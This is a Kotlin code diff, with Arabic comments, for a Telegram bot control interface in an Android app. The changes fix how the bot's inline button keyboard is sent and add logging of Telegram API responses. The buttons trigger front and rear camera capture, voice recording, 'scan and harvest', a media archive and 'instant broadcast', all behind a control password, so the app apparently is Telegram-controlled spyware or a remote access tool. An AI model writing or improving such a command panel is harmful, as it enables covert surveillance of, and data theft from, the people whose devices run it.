@@ -38,6 +38,8 @@ import kotlin.random.Random
  * - ✅ إضافة سجلات تشخيصية مفصلة في handleMessage لمعرفة سبب فشل استقبال الأوامر.
  * - ✅ تحسين دالة verifyControlPassword لتنظيف أعمق من الأحرف الخفية والمسافات غير المرئية.
  * - ✅ إضافة دالة sendMessageDirect للإرسال المباشر بدون الاعتماد على leader token.
+ * - ✅ تحسين معالجة الـ reply_markup باستخدام JSONObject(it) لضمان ظهور الأزرار في تلغرام.
+ * - ✅ تسجيل الرد الكامل من الـ API لتشخيص أي فشل في إرسال لوحة المفاتيح.
  */
 class TelegramUi(
     context: Context,
@@ -613,32 +615,32 @@ class TelegramUi(
     }
 
     // ============================================================
-    // ✅ لوحة الأزرار المحسّنة بإيموجيز فريدة
+    // ✅ لوحة الأزرار المحسّنة بإيموجيز فريدة (تعيد JSONObject)
     // ============================================================
-    fun getMainControlKeyboard(): String {
+    fun getMainControlKeyboard(): JSONObject {
         val keyboard = JSONArray().apply {
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_0"))
-                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "cam_1"))
+                put(JSONObject().put("text", "📸 كاميرا أمامية").put("callback_data", "camf_main"))
+                put(JSONObject().put("text", "📷 كاميرا خلفية").put("callback_data", "cam_main"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🔍 فحص وحصاد").put("callback_data", "hrv"))
-                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic"))
+                put(JSONObject().put("text", "🎙️ تسجيل صوتي").put("callback_data", "mic_start"))
+                put(JSONObject().put("text", "🛡️ فحص وحصاد").put("callback_data", "hrv_now"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📁 أرشيف الوسائط").put("callback_data", "gallery"))
-                put(JSONObject().put("text", "📡 بث فوري").put("callback_data", "send_now"))
+                put(JSONObject().put("text", "📂 أرشيف الوسائط").put("callback_data", "g_nav|all|0"))
+                put(JSONObject().put("text", "🚀 بث فوري").put("callback_data", "send_now"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "📊 حالة النظام").put("callback_data", "status"))
-                put(JSONObject().put("text", "🔌 قطع الاتصال").put("callback_data", "ext"))
+                put(JSONObject().put("text", "🔍 حالة النظام").put("callback_data", "sys_status"))
+                put(JSONObject().put("text", "🔒 قفل الجلسة").put("callback_data", "ext"))
             })
             put(JSONArray().apply {
-                put(JSONObject().put("text", "🔄 إعادة تشغيل").put("callback_data", "restart"))
-                put(JSONObject().put("text", "⚡ تحديث النموذج").put("callback_data", "update_model"))
+                put(JSONObject().put("text", "🔄 تحديث النموذج").put("callback_data", "update_model_all"))
+                put(JSONObject().put("text", "♻️ إعادة تشغيل الخدمة").put("callback_data", "restart_service_all"))
             })
         }
-        return JSONObject().put("inline_keyboard", keyboard).toString()
+        return JSONObject().put("inline_keyboard", keyboard)
     }
 
     fun getPasswordPromptText(): String {
@@ -764,13 +766,15 @@ class TelegramUi(
                 }
                 saveData()
 
+                // ✅ الحصول على لوحة المفاتيح كـ JSONObject وتحويلها إلى String للإرسال
                 val keyboardJson = getMainControlKeyboard()
+                val keyboardJsonString = keyboardJson.toString()
                 MainActivity.appendLogStatic("📤 Sending keyboard to $chatId")
 
                 // ✅ استخدام التوكن الحالي مباشرة بدلاً من leader token
                 val token = activeTokensList.firstOrNull()
                 if (token != null) {
-                    val response = sendMessageDirect(token, chatId, "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار:", keyboardJson)
+                    val response = sendMessageDirect(token, chatId, "🔐 **تم التحقق بنجاح.**\nاختر العملية من الأزرار:", keyboardJsonString)
                     if (response != null) {
                         MainActivity.appendLogStatic("✅ Keyboard sent successfully")
                     } else {
@@ -815,7 +819,9 @@ class TelegramUi(
         }
     }
 
-    // ✅ دالة مساعدة للإرسال المباشر بدون الاعتماد على leader token
+    // ============================================================
+    // ✅ دالة مساعدة للإرسال المباشر - مع تحسين معالجة reply_markup
+    // ============================================================
     private suspend fun sendMessageDirect(token: String?, chatId: Long, text: String, replyMarkup: String?): JSONObject? {
         if (token == null) return null
         return try {
@@ -824,16 +830,31 @@ class TelegramUi(
                 put("text", text)
                 put("parse_mode", "Markdown")
                 put("disable_notification", true)
-                replyMarkup?.let { put("reply_markup", it) }
+                // ✅ التأكد من أن reply_markup يُرسل كـ JSONObject وليس كـ String
+                replyMarkup?.let { 
+                    put("reply_markup", JSONObject(it))
+                }
             }
             val url = "https://api.telegram.org/bot$token/sendMessage"
             val request = Request.Builder().url(url).post(payload.toString().toRequestBody(JSON_MEDIA_TYPE)).build()
             val response = httpClient.newCall(request).execute()
-            val json = JSONObject(response.body?.string() ?: "{}")
-            if (json.optBoolean("ok")) json else null
+            val responseStr = response.body?.string() ?: "{}"
+            val json = JSONObject(responseStr)
+            
+            // ✅ تسجيل الرد الكامل من الـ API لتشخيص أي فشل
+            MainActivity.appendLogStatic("📤 Telegram API response: $responseStr")
+            
+            if (json.optBoolean("ok")) {
+                return json
+            } else {
+                val errorCode = json.optInt("error_code", 0)
+                val description = json.optString("description", "Unknown error")
+                MainActivity.appendLogStatic("❌ Telegram API error: $errorCode - $description")
+                return null
+            }
         } catch (e: Exception) {
             MainActivity.appendLogStatic("❌ sendMessageDirect error: ${e.message}")
-            null
+            return null
         }
     }
 
